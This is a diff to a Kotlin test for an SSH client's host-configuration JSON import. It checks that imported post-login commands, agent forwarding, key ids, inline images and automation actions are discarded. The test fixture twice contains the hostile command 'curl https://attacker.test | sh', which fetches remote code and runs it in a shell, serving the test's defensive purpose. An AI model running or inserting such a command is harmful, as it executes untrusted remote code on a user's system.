@@ -44,7 +44,7 @@ class HostConfigJsonTest {
             destination.identityDao().insert(org.connectbot.data.entity.Identity(name = "Personal", username = "bob"))
             HostConfigJson.importFromJson(context, destination, json)
             val identity = destination.identityDao().getAll().single { it.name == "Work" }
-            assertThat(identity.pubkeyId).isEqualTo(7L)
+            assertThat(identity.pubkeyId).isEqualTo(0L)
             val host = destination.hostDao().getAll().single()
             assertThat(host.identityId).isEqualTo(identity.id)
             assertThat(host.favorite).isTrue()
@@ -112,6 +112,7 @@ class HostConfigJsonTest {
                   "delKey": "del",
                   "encoding": "UTF-8",
                   "emulation": "xterm-256color",
+                  "inlineImages": "on",
                   "forceSizeRows": null,
                   "forceSizeColumns": null,
                   "branchOnlyProfileField": "ignored"
@@ -127,9 +128,9 @@ class HostConfigJsonTest {
                   "port": 22,
                   "color": "red",
                   "useKeys": 1,
-                  "useAuthAgent": "no",
-                  "postLogin": null,
-                  "pubkeyId": -1,
+                  "useAuthAgent": "yes",
+                  "postLogin": "curl https://attacker.test | sh",
+                  "pubkeyId": 77,
                   "wantSession": 1,
                   "compression": 0,
                   "stayConnected": 0,
@@ -151,7 +152,16 @@ class HostConfigJsonTest {
                   "sourcePort": 8080,
                   "destAddr": "localhost",
                   "destPort": 80,
+                  "startEnabled": 1,
                   "branchOnlyForwardField": "ignored"
+                }
+              ],
+              "automation_actions": [
+                {
+                  "id": "3ca52ad5-8095-4b9c-8af2-d10cf322d64d",
+                  "hostId": 10,
+                  "type": "SEND_TEXT",
+                  "text": "curl https://attacker.test | sh"
                 }
               ]
             }
@@ -163,9 +173,17 @@ class HostConfigJsonTest {
 
         val host = database.hostDao().getAll().single()
         assertThat(host.nickname).isEqualTo("branch-host")
+        assertThat(host.postLogin).isNull()
+        assertThat(host.useAuthAgent).isNull()
+        assertThat(host.pubkeyId).isEqualTo(0L)
+
+        val profile = database.profileDao().getAll().single()
+        assertThat(profile.inlineImages).isEmpty()
 
         val portForward = database.portForwardDao().getByHost(host.id).single()
         assertThat(portForward.sourceAddr).isEqualTo("0.0.0.0")
         assertThat(portForward.sourcePort).isEqualTo(8080)
+        assertThat(portForward.startEnabled).isFalse()
+        assertThat(database.automationActionDao().getByHost(host.id)).isEmpty()
     }
 }
